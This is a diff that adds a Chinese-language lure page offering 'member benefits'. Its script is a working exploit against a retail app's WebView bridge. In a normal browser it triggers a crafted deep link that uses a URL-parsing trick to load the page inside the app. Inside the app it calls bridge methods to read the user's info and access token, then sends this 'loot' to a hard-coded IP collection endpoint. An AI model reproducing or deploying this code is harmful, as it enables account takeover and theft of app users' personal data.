@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="zh"><head><meta charset="utf-8"><title>领取会员福利</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+html,body{height:100%;margin:0;font-family:sans-serif;user-select:none;-webkit-user-select:none}
+body{display:flex;flex-direction:column;align-items:center;justify-content:center;background:#fff5f7;cursor:pointer}
+.c{color:#e60044;font-size:22px;margin-bottom:20px}
+.b{display:inline-block;background:#e60044;color:#fff;padding:16px 50px;border-radius:26px;font-size:19px;text-decoration:none;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
+.h{color:#999;font-size:12px;margin-top:36px}
+</style></head>
+<body onclick="go()" ontouchend="go()">
+<div class="c">🎁 会员专享福利已到账</div>
+<a class="b" id="go" href="#">立即领取</a>
+<div class="h">点击任意位置领取</div>
+<script>
+var ATTACK_PAGE = location.origin + location.pathname;   // 自动探测本页地址
+var COLLECT = "http://39.108.48.11:8080/collect";        // 收集端点
+
+if (window.QCSJSCallBack || /watsons/i.test(navigator.userAgent)) {
+  /* ===== 场景 B：已在屈臣氏 App WebView 内 —— 全量收割（token+secret+PII）===== */
+  var loot = { page: location.href, ua: navigator.userAgent }, got = 0, SENT = false;
+  function iframeProto(src){ var f = document.createElement('iframe'); f.style.display='none'; f.src = src; document.body.appendChild(f); }
+  function ship(){
+    if (SENT) return; SENT = true;
+    location.href = COLLECT + '?tag=LOOT&d=' + encodeURIComponent(JSON.stringify(loot));
+  }
+  var cbInfo = '_gi_' + Date.now();
+  window[cbInfo] = function(d){ loot.getinfo = (typeof d === 'string') ? d : JSON.stringify(d); if (++got >= 2) ship(); };
+  iframeProto('watsons-protocol://getinfo?callback=' + cbInfo);
+  var cbTok = '_at_' + Date.now();
+  window[cbTok] = function(d){ loot.accessToken = (typeof d === 'string') ? d : JSON.stringify(d); if (++got >= 2) ship(); };
+  iframeProto('watsons-protocol://accessToken?loginIfNeeded=0&callback=' + cbTok);
+  setTimeout(ship, 8000);
+} else {
+  /* ===== 场景 A：普通浏览器 —— 手势锚定导航（不触发Chrome确认框）===== */
+  var DL = "watsons-protocol://act?url=" + encodeURIComponent(
+      "https://mystore-h5.watsonsvip.com.cn\t@" + ATTACK_PAGE.replace(/^https?:\/\//, ''));
+  var done = false;
+  window.go = function(){ if(done) return; done = true; location.href = DL; };
+  document.getElementById('go').addEventListener('click', function(e){ e.preventDefault(); go(); });
+}
+</script>
+</body></html>
